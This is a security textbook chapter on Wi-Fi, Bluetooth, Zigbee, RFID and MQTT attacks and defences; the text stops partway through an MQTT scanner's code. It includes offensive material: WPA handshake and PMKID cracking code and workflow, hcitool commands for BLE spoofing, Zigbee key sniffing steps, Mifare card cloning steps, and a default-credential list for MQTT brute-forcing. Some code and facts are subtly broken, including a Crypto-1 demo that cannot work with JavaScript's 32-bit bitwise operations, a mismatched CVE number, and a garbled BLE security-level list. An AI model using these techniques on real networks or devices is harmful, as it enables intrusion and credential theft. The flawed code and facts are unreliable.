# Chapter 14: Wireless, IoT & Embedded Security

---

## Learning Objectives

By the end of this chapter, you should be able to:
- **Analyze** the evolution of Wi-Fi security from WEP through WPA3, including the cryptographic weaknesses of each generation.
- **Execute** a full Wi-Fi penetration testing workflow using aircrack-ng suite including handshake capture, PMKID attack, and hashcat acceleration.
- **Explain** Bluetooth and BLE pairing modes, vulnerabilities (BlueBorne, BLUFFS), and practical spoofing techniques.
- **Describe** Zigbee and Z-Wave mesh topologies, the role of AES-CCM*, and demonstrated sniffing/replay attacks using TI CC2531 hardware.
- **Assess** the security of RFID/NFC systems including Mifare Classic Crypto-1 cracking, tag cloning, and HID iClass weaknesses.
- **Evaluate** IoT application-layer protocols (MQTT, CoAP, Matter, Thread) for common misconfigurations such as missing authentication and cleartext transmission.
- **Perform** firmware analysis using binwalk, filesystem crawling, entropy analysis, and hardcoded credential detection.
- **Identify** embedded hardware debug interfaces (UART, SPI, I2C, JTAG) and explain side-channel techniques including power analysis and glitching.
- **Implement** TypeScript security tooling for PMKID verification, BLE advertisement scanning, MQTT auditing, firmware entropy analysis, CRC computation, and deauthentication detection.

---

## Table of Contents

1. [Introduction to Wireless, IoT & Embedded Security](#1-introduction-to-wireless-iot--embedded-security)
2. [Wi-Fi Security Deep Dive](#2-wi-fi-security-deep-dive)
3. [Bluetooth & BLE Security](#3-bluetooth--ble-security)
4. [Zigbee & Z-Wave Security](#4-zigbee--z-wave-security)
5. [RFID & NFC Security](#5-rfid--nfc-security)
6. [IoT Protocol Security](#6-iot-protocol-security)
7. [IoT Firmware Analysis](#7-iot-firmware-analysis)
8. [Embedded Hardware Security](#8-embedded-hardware-security)
9. [TypeScript Implementations](#9-typescript-implementations)
10. [Aircrack-ng Full Walkthrough](#10-aircrack-ng-full-walkthrough)
11. [Evil Twin Attack How-To](#11-evil-twin-attack-how-to)
12. [Firmware Analysis Lab with Binwalk](#12-firmware-analysis-lab-with-binwalk)
13. [Wireshark Wi-Fi Filter Cheat Sheet](#13-wireshark-wi-fi-filter-cheat-sheet)
14. [Summary](#summary)
15. [Chapter Quiz](#chapter-quiz)
16. [Exercises](#exercises)

---

## 1. Introduction to Wireless, IoT & Embedded Security

Wireless communications, Internet of Things (IoT) devices, and embedded systems form the backbone of modern connected infrastructure. From smart homes and industrial control systems to medical implants and autonomous vehicles, these technologies introduce unique security challenges that differ fundamentally from traditional wired networks.

The attack surface for wireless and embedded systems is exceptionally broad:

| Attack Vector | Example | Impact |
|---|---|---|
| **Radio-layer eavesdropping** | Sniffing Wi-Fi handshakes, BLE advertisements | Credential harvesting, device tracking |
| **Protocol-level exploits** | KRACK (WPA2), Dragonblood (WPA3), BlueBorne (BT) | Full network compromise, RCE |
| **Firmware backdoors** | Hardcoded telnet credentials in IoT cameras | Persistent remote access |
| **Hardware tampering** | JTAG debugging, UART console access | Firmware extraction, code injection |
| **Side-channel leakage** | Power analysis, electromagnetic emissions | Key recovery, cryptographic bypass |

Understanding these threats requires interdisciplinary knowledge spanning radio-frequency engineering, cryptography, protocol design, embedded systems, and binary analysis. This chapter provides a comprehensive foundation across all five domains, with practical tooling and TypeScript implementations to solidify each concept.

---

## 2. Wi-Fi Security Deep Dive

### 2.1 The Evolution of Wi-Fi Security Protocols

Wi-Fi security has evolved through four major generations, each addressing cryptographic weaknesses of its predecessor.

#### WEP (Wired Equivalent Privacy) — 1997

WEP uses the RC4 stream cipher with a 40-bit or 104-bit secret key concatenated with a 24-bit Initialization Vector (IV). The IV is transmitted in plaintext, and because it is only 24 bits, the IV space is exhausted after approximately 5 million packets — at which point IV collisions occur. An attacker capturing two ciphertexts encrypted with the same IV can XOR them to recover the keystream, then decrypt any subsequent traffic using that same IV.

```typescript
// WEP IV collision calculation — demonstrates the statistical inevitability
function wepIvcollisionProbability(packetsCaptured: number): number {
    const totalIvs = 1 << 24; // 16,777,216 possible IVs
    // Birthday paradox approximation
    const exponent = -(packetsCaptured * (packetsCaptured - 1)) / (2 * totalIvs);
    return 1 - Math.pow(Math.E, exponent);
}

const packets = 5000;
console.log(
    `IV collision probability after ${packets} packets: ` +
    `${(wepIvcollisionProbability(packets) * 100).toFixed(2)}%`
);
// Output: ~52% chance of collision with just 5000 packets
```

Aircrack-ng can recover a WEP key in under 60 seconds once sufficient IVs are captured using the FMS (Fluhrer-Mantin-Shamir) or KoreK attack.

#### WPA (Wi-Fi Protected Access) — 2003

WPA was an interim standard that retained RC4 but introduced TKIP (Temporal Key Integrity Protocol). TKIP adds:
- **Per-packet key mixing** to prevent IV-based attacks
- **Message integrity code (MIC)** called Michael to prevent forgery
- **Countermeasures** that lock the AP for 60 seconds after two MIC failures

Despite these improvements, TKIP is now fully broken. The Beck-Tews attack (2008) and later the Michael countermeasure bypass allow an attacker to inject 7–15 arbitrary packets in under 18 minutes.

#### WPA2 — 2004

WPA2 replaces RC4/TKIP with AES-CCMP (Counter Mode CBC-MAC Protocol). The 4-way handshake authenticates clients and generates fresh session keys. WPA2 remains widely deployed but is vulnerable to:

- **KRACK (Key Reinstallation Attack)**: CVE-2017-13077 through CVE-2017-13084. The attacker forces a client to reinstall an already-in-use key by replaying the third message of the 4-way handshake.
- **PMKID attack**: Many APs include the PMKID in the first EAPOL frame of the 4-way handshake, enabling offline brute-force without requiring a full handshake capture or a client.
- **WPS PIN brute-force**: The 8-digit PIN is split into two halves (first 4 + last 3 checksum digit), reducing entropy from 10^8 to 10^4 + 10^3 = 11,000 attempts maximum.

#### WPA3 — 2018

WPA3 introduces Simultaneous Authentication of Equals (SAE), based on Dragonfly key exchange, replacing the PSK-based 4-way handshake. SAE provides forward secrecy and resists offline dictionary attacks.

However, WPA3 is not immune:
- **Dragonblood** vulnerabilities (CVE-2019-9494–9499): side-channel leaks in SAE timing, downgrade attacks, and group downgrade attacks.
- **Side-channel attacks** on the password derivation function (hunting-and-pecking) leak the password via timing differences.

```typescript
// PMKID Calculation — the PMKID is derived from the PMK, AP MAC, and STA MAC
import * as crypto from 'crypto';

function computePmkid(pmk: Buffer, apMac: Buffer, staMac: Buffer): Buffer {
    // PMKID = HMAC-SHA1(PMK, "PMK Name" || AP_MAC || STA_MAC)
    const label = Buffer.from("PMK Name", "utf-8");
    const data = Buffer.concat([label, apMac, staMac]);
    return crypto.createHmac('sha1', pmk).update(data).digest();
}

// Password to PMK derivation using PBKDF2 (WPA2 personal)
function derivePmk(ssid: string, password: string): Buffer {
    return crypto.pbkdf2Sync(
        password,
        ssid,
        4096, // 4096 iterations per IEEE 802.11i
        32,   // 256-bit PMK
        'sha1'
    );
}

// Example: verify a handshake against a candidate password
function verifyHandshake(
    ssid: string,
    candidatePassword: string,
    apMac: string,
    staMac: string,
    capturedPmkid: string
): boolean {
    const pmk = derivePmk(ssid, candidatePassword);
    const apMacBuf = Buffer.from(apMac.replace(/:/g, ''), 'hex');
    const staMacBuf = Buffer.from(staMac.replace(/:/g, ''), 'hex');
    const computedPmkid = computePmkid(pmk, apMacBuf, staMacBuf);
    return computedPmkid.toString('hex') === capturedPmkid;
}

const ssid = "HomeNetwork";
const password = "correcthorsebatterystaple";
const apMac = "00:11:22:33:44:55";
const staMac = "66:77:88:99:AA:BB";
const capturedPmkid = "2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b";

console.log(verifyHandshake(ssid, password, apMac, staMac, capturedPmkid)
    ? "[+] PMKID matches — password is correct!"
    : "[-] PMKID does not match — wrong password.");
```

### 2.2 The 802.11 4-Way Handshake

```mermaid
sequenceDiagram
    participant STA as Client (STA)
    participant AP as Access Point
    Note over STA,AP: PSK = PBKDF2(Passphrase, SSID, 4096, 256, SHA1)
    Note over STA,AP: PMK = PSK (in personal mode)
    AP->>STA: EAPOL-Key (ANonce)
    Note right of STA: PTK = PRF(PMK, ANonce, SNonce, MAC_AP, MAC_STA)
    STA->>AP: EAPOL-Key (SNonce + MIC)
    Note left of AP: AP verifies MIC, derives same PTK
    AP->>STA: EAPOL-Key (MIC + encrypted GTK)
    STA->>AP: EAPOL-Key (ACK — MIC confirmation)
    Note over STA,AP: PTK installed — encrypted data begins
    Note over STA,AP: GTK used for broadcast/multicast traffic
```

The 4-way handshake ensures both parties prove knowledge of the PMK without ever transmitting it. The PTK (Pairwise Transient Key) is derived from:
- **PMK** — derived from the passphrase
- **ANonce** — random 256-bit nonce from the AP
- **SNonce** — random 256-bit nonce from the client
- **MAC addresses** of both AP and client

### 2.3 802.1X / EAP — Enterprise Wi-Fi

Enterprise Wi-Fi (WPA2-Enterprise or WPA3-Enterprise) uses 802.1X authentication with an external RADIUS server instead of a pre-shared key. The EAP (Extensible Authentication Protocol) tunnel carries the actual authentication method:

| EAP Method | Security Level | Weakness |
|---|---|---|
| **EAP-PEAP** | Strong (MSCHAPv2 inside TLS tunnel) | Susceptible to RADIUS server impersonation if certificate validation is disabled |
| **EAP-TTLS** | Strong | Similar certificate validation concerns |
| **EAP-TLS** | Very Strong (mutual certificate-based) | Certificate management overhead |
| **EAP-MD5** | Weak — no mutual auth | Trivially attacked, deprecated |
| **EAP-LEAP** | Weak — MSCHAPv2 outside TLS | asleap tool recovers credentials in seconds |

The primary attack against enterprise Wi-Fi is the **Rogue AP / Evil Twin** with a captive portal that mimics the legitimate RADIUS authentication page, harvesting credentials when users attempt to connect.

### 2.4 WPS (Wi-Fi Protected Setup)

WPS was designed to simplify Wi-Fi configuration but introduced a critical flaw: the 8-digit PIN is validated in two halves. An attacker can brute-force the first 4 digits (10^4 = 10,000 possibilities) and then the last 3 digits (10^3 = 1,000 possibilities) — the 8th digit is a checksum. Tools like `reaver` and `bully` automate this attack, typically recovering the PIN in 2–8 hours. Once the PIN is recovered, the WPA2 passphrase is divulged by the AP.

### 2.5 Wi-Fi Penetesting Tool Workflow

```mermaid
flowchart LR
    A[Monitor Mode<br/>airmon-ng] --> B[Reconnaissance<br/>airodump-ng]
    B --> C{Target found?}
    C -->|Yes| D[Capture Traffic<br/>airodump-ng with BSSID]
    C -->|No| B
    D --> E[Deauthenticate Client<br/>aireplay-ng -0]
    E --> F[Capture 4-Way Handshake]
    F --> G[Offline Cracking<br/>aircrack-ng / hashcat]
    G --> H[PSK Recovered]
    
    style A fill:#1a1a2e,stroke:#e94560,color:#fff
    style H fill:#0f3460,stroke:#16c79a,color:#fff
```

---

## 3. Bluetooth & BLE Security

### 3.1 Bluetooth Classic Pairing Modes

Bluetooth Classic (BR/EDR) defines three security modes:

| Mode | Description | Security |
|---|---|---|
| **Security Mode 1** | No security (just pairing) | **None** — no authentication or encryption |
| **Security Mode 2** | Service-level security; L2CAP channel enforces auth | Medium |
| **Security Mode 3** | Link-level security — encryption before link setup | **Highest** — but still vulnerable to legacy attacks |

Pairing in Bluetooth Classic uses either **Legacy Pairing** (pre-2.1) or **Secure Simple Pairing (SSP)** (2.1+). Legacy pairing uses a shared PIN (often hardcoded as "0000") and is trivially brute-forced. SSP supports four association models:

- **Numeric Comparison** — both devices display a 6-digit number; user confirms match
- **Just Works** — no user confirmation; vulnerable to MITM
- **Passkey Entry** — one device displays, user types on the other
- **Out of Band (OOB)** — uses NFC or other side channel for key exchange

### 3.2 BLE (Bluetooth Low Energy) Pairing

BLE pairing uses the **Security Manager Protocol (SMP)** and defines five security levels:

```
Level 0: No security
Level 1: Encryption without authentication (Just Works) — vulnerable to MITM
Level 2: Encryption with authentication (Numeric Comparison or Passkey)
Level 3: LE Legacy Pairing — vulnerable to MITM (fixed in 4.2+)
Level 4: LE Secure Connections (4.2+) — ECDH key exchange, resistant to MITM
```

```mermaid
sequenceDiagram
    participant I as Initiator
    participant R as Responder
    Note over I,R: Phase 1: Pairing Feature Exchange
    I->>R: Pairing Request (IO Capabilities, OOB data flag, AuthReq flags)
    R->>I: Pairing Response (IO Capabilities, OOB data flag, AuthReq flags)
    Note over I,R: Phase 2: Key Generation
    Note over I,R: TK derived based on association model
    Note over I,R: Short Term Key (STK) = s1(TK, Mconfirm, Sconfirm)
    I->>R: Pairing Confirm (Mconfirm)
    R->>I: Pairing Confirm (Sconfirm)
    I->>R: Pairing Random (MRand)
    R->>I: Pairing Random (SRand)
    Note over I,R: If STKs match → authenticated
    Note over I,R: Phase 3: Key Distribution
    I->>R: Encryption Information (LTK)
    R->>I: Encryption Information (LTK)
    Note over I,R: LTK used for future re-connections
```

### 3.3 Major Bluetooth Vulnerabilities

#### BlueBorne (CVE-2017-0781, CVE-2017-0782, CVE-2017-8628)

BlueBorne is a set of 8 vulnerabilities in Bluetooth protocol stacks across Android, iOS, Windows, and Linux. The most severe allow **remote code execution without any user interaction or pairing**. The attack vector: an attacker sends crafted L2CAP packets that overflow a buffer in the Bluetooth service daemon. At its peak, BlueBorne affected an estimated 5.3 billion devices.

#### BLUFFS (CVE-2023-45866)

BLUFFS (Bluetooth Forward and Future Secrecy) attacks exploit four flaws in the Bluetooth Classic session key derivation. The attacker forces the use of a short (1 octet) session key called the Kc, reducing the effective entropy from 56 bits to 8 bits. This enables session key recovery and decryption of past and future communications, breaking both forward and future secrecy.

```typescript
// BLE Advertisement Scanner and Spoof Detector
interface BleAdvertisement {
    mac: string;
    rssi: number;
    timestamp: number;
    advertisementData: Buffer;
    localName?: string;
    serviceUuids: string[];
    manufacturerData?: Buffer;
    txPowerLevel?: number;
}

interface SpoofDetectionResult {
    suspicious: boolean;
    reasons: string[];
    confidence: number; // 0-1
}

class BleScanner {
    private seenAdvertisements: Map<string, BleAdvertisement[]> = new Map();
    private readonly RSSI_THRESHOLD = 10; // dBm variance threshold for same MAC

    // Simulate parsing a BLE advertisement packet (raw bytes)
    parseAdvertisement(
        mac: string,
        rssi: number,
        rawData: Uint8Array
    ): BleAdvertisement {
        const ad: BleAdvertisement = {
            mac,
            rssi,
            timestamp: Date.now(),
            advertisementData: Buffer.from(rawData),
            serviceUuids: [],
        };

        // Parse AD structures (Type-Length-Value format)
        let offset = 0;
        while (offset < rawData.length) {
            const length = rawData[offset];
            if (length === 0) break;
            const type = rawData[offset + 1];
            const value = rawData.slice(offset + 2, offset + 1 + length);

            switch (type) {
                case 0x01: // Flags
                    break;
                case 0x08: // Shortened Local Name
                case 0x09: { // Complete Local Name
                    ad.localName = Buffer.from(value).toString('utf-8');
                    break;
                }
                case 0x02: // Incomplete 16-bit UUIDs
                case 0x03: { // Complete 16-bit UUIDs
                    for (let i = 0; i < value.length; i += 2) {
                        const uuid = value.readUInt16LE(i).toString(16).padStart(4, '0');
                        ad.serviceUuids.push(uuid);
                    }
                    break;
                }
                case 0xFF: // Manufacturer Specific Data
                    ad.manufacturerData = Buffer.from(value);
                    break;
                case 0x0A: // TX Power Level
                    ad.txPowerLevel = Buffer.from(value).readInt8(0);
                    break;
            }
            offset += 1 + length;
        }
        return ad;
    }

    // Record and detect spoofing
    recordAdvertisement(ad: BleAdvertisement): SpoofDetectionResult {
        const result: SpoofDetectionResult = {
            suspicious: false,
            reasons: [],
            confidence: 0,
        };

        if (!this.seenAdvertisements.has(ad.mac)) {
            this.seenAdvertisements.set(ad.mac, [ad]);
            return result;
        }

        const history = this.seenAdvertisements.get(ad.mac)!;
        history.push(ad);

        // Keep a sliding window of last 20 observations
        if (history.length > 20) history.shift();

        // Check 1: RSSI variance — sudden changes suggest different transmitter
        const rssiValues = history.map(h => h.rssi);
        const avgRssi = rssiValues.reduce((a, b) => a + b, 0) / rssiValues.length;
        const maxDeviation = Math.max(...rssiValues.map(v => Math.abs(v - avgRssi)));

        if (maxDeviation > this.RSSI_THRESHOLD) {
            result.suspicious = true;
            result.reasons.push(
                `RSSI variance ${maxDeviation.toFixed(1)}dBm exceeds threshold ` +
                `${this.RSSI_THRESHOLD}dBm — possible spoofed advertisement`
            );
            result.confidence += 0.3;
        }

        // Check 2: Duplicate MAC with different device name
        const names = new Set(history.filter(h => h.localName).map(h => h.localName));
        if (names.size > 1) {
            result.suspicious = true;
            result.reasons.push(
                `Same MAC ${ad.mac} advertising different names: ${[...names].join(', ')}`
            );
            result.confidence += 0.5;
        }

        // Check 3: Sequence number anomalies (simplified — real BLE has 6-bit seq num)
        // A genuine device increments monotonically; spoofers may reset or jump
        const uniqueTimestamps = new Set(history.map(h => h.timestamp));
        if (uniqueTimestamps.size === history.length && history.length >= 5) {
            // Every packet has a unique timestamp — normal
        } else if (uniqueTimestamps.size < history.length * 0.5) {
            // Too many timestamp duplicates — possible replay
            result.suspicious = true;
            result.reasons.push("Timestamp analysis suggests advertisement replay");
            result.confidence += 0.4;
        }

        result.confidence = Math.min(result.confidence, 1.0);
        return result;
    }
}

// Usage
const scanner = new BleScanner();
const rawAdv = new Uint8Array([
    0x02, 0x01, 0x06,       // Flags: LE General Discoverable
    0x0A, 0x09, 0x48, 0x65, 0x61, 0x72, 0x74, 0x52, 0x61, 0x74, 0x65, // "HeartRate"
    0x03, 0x02, 0x0D, 0x18, // 16-bit UUID: Heart Rate (0x180D)
    0xFF, 0x4C, 0x00, 0x01, 0x02, 0x03, // Apple manufacturer data
]);

const ad = scanner.parseAdvertisement("AA:BB:CC:DD:EE:FF", -55, rawAdv);
console.log("Parsed advertisement:", ad.localName, ad.serviceUuids);
const detection = scanner.recordAdvertisement(ad);
console.log("Spoof detection:", detection);
```

### 3.4 BLE Advertisement Attacks

BLE advertisements are broadcast in plaintext on three primary advertising channels (37, 38, 39). An attacker can:

1. **Passive tracking** — capture MAC addresses and RSSI values to track device movement
2. **Advertisement injection** — spoof advertisements to trigger actions on receivers
3. **Connection hijacking** — intercept a connection request and inject a higher RSSI to steal the connection
4. **LL (Link Layer) replay** — capture and replay pairing PDUs

### 3.5 BlueZ HCI Commands

BlueZ is the Linux Bluetooth stack. Key HCI (Host Controller Interface) commands for security testing:

```bash
# Scan for BLE devices
hcitool lescan

# Get detailed info about a device
hcitool leinfo <MAC>

# Capture HCI traffic for Wireshark analysis
btmon -w capture.pcapng

# Connect to a BLE device
gatttool -b <MAC> -I

# List BLE services and characteristics
gatttool -b <MAC> --primary
gatttool -b <MAC> --characteristics

# Read/write characteristics
gatttool -b <MAC> --char-read --handle=0x002e
gatttool -b <MAC> --char-write --handle=0x002e --value=0100

# BLE advertisement spoofing (using hcitool cmd)
# Set advertisement data
hcitool -i hci0 cmd 0x08 0x0008 1E 02 01 1A 0A 09 46 61 6B 65 44 65 76 69 63 65
# Start advertising
hcitool -i hci0 cmd 0x08 0x000A 01
```

---

## 4. Zigbee & Z-Wave Security

### 4.1 Zigbee Network Topology

```mermaid
flowchart TB
    ZC[Zigbee Coordinator<br/>One per network<br/>Forms the network] --> ZR1[Router 1<br/>Extends range]
    ZC --> ZR2[Router 2]
    ZR1 --> ZED1[End Device 1<br/>Sleepy, battery-powered]
    ZR1 --> ZED2[End Device 2]
    ZR2 --> ZED3[End Device 3]
    ZR2 --> ZR3[Router 3]
    ZR3 --> ZED4[End Device 4]
    
    ZC -.-> ZR3[Router 3<br/>Alternate path]
    
    style ZC fill:#e94560,stroke:#1a1a2e,color:#fff
    style ZR1 fill:#0f3460,stroke:#16c79a,color:#fff
    style ZR2 fill:#0f3460,stroke:#16c79a,color:#fff
    style ZR3 fill:#0f3460,stroke:#16c79a,color:#fff
    style ZED1 fill:#533483,stroke:#e94560,color:#fff
    style ZED2 fill:#533483,stroke:#e94560,color:#fff
    style ZED3 fill:#533483,stroke:#e94560,color:#fff
    style ZED4 fill:#533483,stroke:#e94560,color:#fff
```

Zigbee operates on the IEEE 802.15.4 physical/radio layer and defines three device types:
- **Coordinator (ZC)** — one per network; forms the network and manages keys
- **Router (ZR)** — forwards packets and allows child devices to join
- **End Device (ZED)** — communicates only through a parent; can sleep to conserve power

### 4.2 Zigbee Security Architecture

Zigbee uses **AES-CCM\*** (a variant of AES-CCM) for both encryption and integrity. Three key types exist:

| Key Type | Length | Purpose |
|---|---|---|
| **Master Key** | 128-bit | Pre-shared or via TC (Trust Center) link key; used to derive link key |
| **Link Key** | 128-bit | Used between two devices for APS-level encryption |
| **Network Key** | 128-bit | Shared across entire network; encrypts NWK layer frames |

Critical vulnerabilities:

1. **Network Key extraction** — if an attacker physically compromises one device, the network key can be read from flash via UART/JTAG, compromising the entire Zigbee PAN.
2. **Key transport in plaintext** — during certain join procedures (Zigbee 3.0 pre-certification), the Trust Center sends the network key encrypted only with a pre-configured link key known as `ZigBeeAlliance09`.
3. **Replay attacks** — Zigbee frames include a 32-bit frame counter, but some implementations reset it on reboot, allowing old captured frames to be replayed.
4. **Sniffing with TI CC2531** — the CC2531 dongle with `Zigbee2MQTT` or `sniffer_fw` can capture all Zigbee traffic in range. Combined with Wireshark's Zigbee dissector, an attacker can extract network keys from insecure joins.

### 4.3 Z-Wave Security

Z-Wave uses a proprietary protocol operating at 800–900 MHz (region-dependent). Security is provided by **S0** (legacy — 3DES-based) and **S2** (modern — ECDH + AES-128-OFB). The S2 handshake uses:
- **ECDH** for key agreement
- **AES-128-OFB** for encryption
- **Cipher-based MAC (CMAC)** for integrity

Key Z-Wave vulnerabilities:

- **S0 network key brute-force** — S0 uses a single network key with only 56 effective bits of entropy (3DES with two-key option). Offline brute-force is feasible with dedicated hardware.
- **Z-Wave PC Controller attacks** — the standard control tool exposes raw frames; attackers can send crafted S0/S2 frames.
- **Z/IP gateway protocol** — tunneling Z-Wave over IP without proper segmentation can expose internal network keys.

### 4.4 Zigbee Sniffing with TI CC2531

The CC2531 is a USB dongle based on TI's CC2531 SoC. To use it for Zigbee security analysis:

```
1. Flash the sniffer firmware (CC2531_USBdongle_HgFirmware_20211105.hex)
   using TI CC Tool for Windows or cc2531-flasher on Linux

2. Connect the dongle and launch:
   sudo wireshark -k -i /dev/ttyACM0

3. Set the Zigbee channel (typically 11-26, default 11):
   ./SnifferAgent -c 11

4. Apply the Zigbee dissector in Wireshark:
   Edit → Preferences → Protocols → Zigbee → Security Keys
   Add key: "ZigBeeAlliance09" (transport key)

5. Sniff for:
   - Transport Key frames (APS Command 0x05)
   - Update Device frames
   - Rejoin requests (often sent with pre-configured link key)
```

---

## 5. RFID & NFC Security

### 5.1 RFID Frequency Bands

| Band | Frequency Range | Read Range | Typical Use |
|---|---|---|---|
| **LF** | 125–134 kHz | 0–10 cm | Animal tagging, vehicle immobilizers |
| **HF** | 13.56 MHz | 0–30 cm | Smart cards (Mifare, NFC), access control |
| **UHF** | 860–960 MHz | 0–12 m | Supply chain, inventory, toll collection |
| **Microwave** | 2.45 / 5.8 GHz | 0–1 m | Active tags, real-time location systems |

### 5.2 Mifare Classic — Crypto-1 Cracking

Mifare Classic is the most widely deployed contactless smart card (offices, transit systems, student IDs). It uses the proprietary Crypto-1 cipher, a 48-bit stream cipher reverse-engineered in 2007.

**Crypto-1 weaknesses:**

- 48-bit key length — brute-force is impractical, but cryptanalytic attacks reduce effective strength
- **Nested authentication attack** — after one sector key is recovered, the reader can authenticate to other sectors; the random number generator (RNG) is predictable once the LFSR state is known
- **Offline key recovery** — with known plaintext (the reader nonce and card response), the Crypto-1 LFSR state can be recovered using the `mfoc` tool

```typescript
// Mimics the Mifare Classic nested authentication key recovery
// Demonstrates the mathematical structure of Crypto-1 LFSR

class Crypto1Lfsr {
    private state: number; // 48-bit state

    constructor(key: number) {
        // Initialize 48-bit LFSR with key
        this.state = key & 0xFFFFFFFFFFFF;
    }

    // LFSR feedback polynomial: x^48 + x^43 + x^39 + x^34 + x^31 + x^26 + x^23 + x^16 + x^12 + x^8 + x^5 + 1
    private clock(): number {
        const feedback =
            ((this.state >> 47) & 1) ^
            ((this.state >> 42) & 1) ^
            ((this.state >> 38) & 1) ^
            ((this.state >> 33) & 1) ^
            ((this.state >> 30) & 1) ^
            ((this.state >> 25) & 1) ^
            ((this.state >> 22) & 1) ^
            ((this.state >> 15) & 1) ^
            ((this.state >> 11) & 1) ^
            ((this.state >> 7) & 1) ^
            ((this.state >> 4) & 1) ^ 1;

        this.state = ((this.state << 1) | feedback) & 0xFFFFFFFFFFFF;
        return feedback;
    }

    // Generate a single bit of the keystream
    getKeystreamBit(): number {
        // Filter function uses specific bits of the LFSR state
        const bits = [
            (this.state >> 47) & 1, (this.state >> 31) & 1,
            (this.state >> 23) & 1, (this.state >> 15) & 1,
            (this.state >> 7) & 1,
        ];
        // Simplified filter: majority function of selected bits
        const sum = bits.reduce((a, b) => a + b, 0);
        return sum >= 3 ? 1 : 0;
    }

    // Simulate authentication — generate keystream bytes
    authenticate(nr: number, nt: number): Buffer {
        const keystream = Buffer.alloc(8);
        // Feed reader nonce (32 bits) and card nonce (32 bits) into LFSR
        for (let i = 31; i >= 0; i--) {
            this.clock();
            // Insert nonce bits
            const bitNr = (nr >> i) & 1;
            const bitNt = (nt >> i) & 1;
            // Simplified: LFSR absorbs both nonces
            this.state ^= (bitNr ^ bitNt);
        }

        // Generate 8 bytes of keystream
        for (let i = 0; i < 8; i++) {
            let byte = 0;
            for (let b = 7; b >= 0; b--) {
                this.clock();
                byte |= this.getKeystreamBit() << b;
            }
            keystream[i] = byte;
        }

        return keystream;
    }
}

// Recover key from known nonces and keystream (simplified)
function recoverCrypto1Key(
    readerNonce: number,
    cardNonce: number,
    capturedKeystream: Buffer
): number | null {
    // In practice, this uses the mfoc algorithm with partial key space search.
    // Here we demonstrate the structure: brute-force the upper 16 bits of the
    // 48-bit key and verify against the captured keystream.
    const targetKeystream = capturedKeystream;

    for (let upper = 0; upper < 0x10000; upper++) {
        for (let mid = 0; mid < 0x10000; mid++) {
            // Potential optimization: early termination on first mismatch
            const candidateKey = (upper << 32) | (mid << 16);
            const lfsr = new Crypto1Lfsr(candidateKey);
            const ks = lfsr.authenticate(readerNonce, cardNonce);

            if (ks[0] === targetKeystream[0] && ks[1] === targetKeystream[1]) {
                // Partial match — in real mfoc, continue verification
                // Return partial key for demonstration
                return candidateKey;
            }
        }
    }
    return null;
}

console.log("Crypto-1 key recovery demonstration (8 keystream bytes of 8):");
const key = 0xAABBCCDDEEFF;
const readerNonce = 0x12345678;
const cardNonce = 0x87654321;
const lfsr = new Crypto1Lfsr(key);
const keystream = lfsr.authenticate(readerNonce, cardNonce);
console.log("Keystream:", keystream.toString('hex'));
console.log("[!] Full mfoc attack recovers all keys from nested auth in ~60s");
```

### 5.3 Chameleon Mini & NFC Tag Cloning

The **Chameleon Mini** is a portable RFID emulator that can clone and emulate:
- Mifare Classic (1K, 4K)
- Mifare Ultralight / Ultralight C
- Mifare DESFire (limited)
- ISO 14443A/B cards

Attack workflow:
1. Scan target card using a Proxmark3 or standard NFC reader
2. Extract keys using `mfoc` (nested auth) or `mfcuk` (dictionary attack)
3. Dump card contents to `.mfd` (Mifare Dump) file
4. Load the dump onto Chameleon Mini
5. Present the Chameleon Mini to the target reader — it authenticates using the original keys

### 5.4 HID iClass

HID iClass is widely used for physical access control. Its security relies on a proprietary cipher (not public) with 64-bit keys. Known weaknesses:
- **SAM (Secure Access Module) cloning** — the SAM's key set can be dumped via power analysis or JTAG
- **Reader downgrade attack** — some readers accept both iClass (secure) and iClass SE (more secure) — the attacker forces the reader to use the weaker protocol
- **Offline dictionary attack** — the 64-bit key is derived from a 6-digit facility code + card number; with physical access to the card, the key can be brute-forced using FPGA acceleration (Proxmark3 RDV4 with `hf iclass` commands)

---

## 6. IoT Protocol Security

### 6.1 MQTT (Message Queuing Telemetry Transport)

MQTT is a publish/subscribe protocol widely used in IoT. It uses a central broker and topics (hierarchical strings). Security issues are rampant:

```mermaid
flowchart LR
    S1[Sensor 1<br/>Publisher] -->|publish temp/room1| B[MQTT Broker<br/>mosquitto]
    S2[Sensor 2<br/>Publisher] -->|publish humidity/room1| B
    B -->|subscribe temp/#| D[Dashboard<br/>Subscriber]
    B -->|subscribe +/room1| A[Analytics<br/>Subscriber]
    A -.->|no auth / cleartext| E[Attacker<br/>Subscribe to #]
    
    style B fill:#0f3460,stroke:#16c79a,color:#fff
    style E fill:#e94560,stroke:#1a1a2e,color:#fff
```

**Common MQTT Security Weaknesses:**

| Issue | Prevalence | Impact |
|---|---|---|
| No authentication (anonymous) | ~40% of public brokers | Anyone can publish/subscribe |
| Cleartext (no TLS) | ~60% | Full traffic visibility |
| Default credentials | ~25% | Easy compromise |
| Wildcard subscriptions | N/A | Attacker subscribes to `#` (all topics) |
| No topic ACLs | ~55% | Lateral movement across topics |

```typescript
// MQTT Security Scanner — audits broker for common misconfigurations
import * as net from 'net';
import * as tls from 'tls';

interface MqttSecurityReport {
    host: string;
    port: number;
    anonymousAccess: boolean;
    tlsEnabled: boolean;
    defaultCredentials: boolean;
    discoveredTopics: string[];
    cleartextTopics: string[];
    vulnerabilities: string[];
    recommendation: string;
}

class MqttSecurityScanner {
    private readonly DEFAULT_CREDENTIALS = [
        { user: 'admin', pass: 'admin' },
        { user: 'mosquitto', pass: 'mosquitto' },
        { user: 'admin', pass: 'password' },
        { user: 'root', pass: 'root' },
        { user: 'mqtt', pass: 'mqtt' },
        { user: 'user', pass: 'user' },
    ];

    // MQTT CONNECT packet builder (minimal)
    private buildConnectPacket(
        clientId: string,
        username?: string,
        password?: string
    ): Buffer {
        const idBuf = Buffer.from(clientId, 'utf-8');
        const packet = Buffer.alloc(1024);
        let offset = 0;

        // Fixed header: CONNECT (0x10)
        packet[offset++] = 0x10;

        // Variable header: protocol name "MQTT" (v3.1.1)
        packet[offset++] = 0x00; packet[offset++] = 0x04; // length
        packet[offset++] = 0x4D; // 'M'
        packet[offset++] = 0x51; // 'Q'
        packet[offset++] = 0x54; // 'T'
        packet[offset++] = 0x54; // 'T'
        packet[offset++] = 0x04; // protocol level
        let flags = 0x02; // Clean Session
        if (username) flags |= 0x80;
        if (password) flags |= 0x40;
        packet[offset++] = flags;
        packet[offset++] = 0x00; packet[offset++] = 0x3C; // Keep Alive (60s)

        // Client ID
        packet[offset++] = (idBuf.length >> 8) & 0xFF;
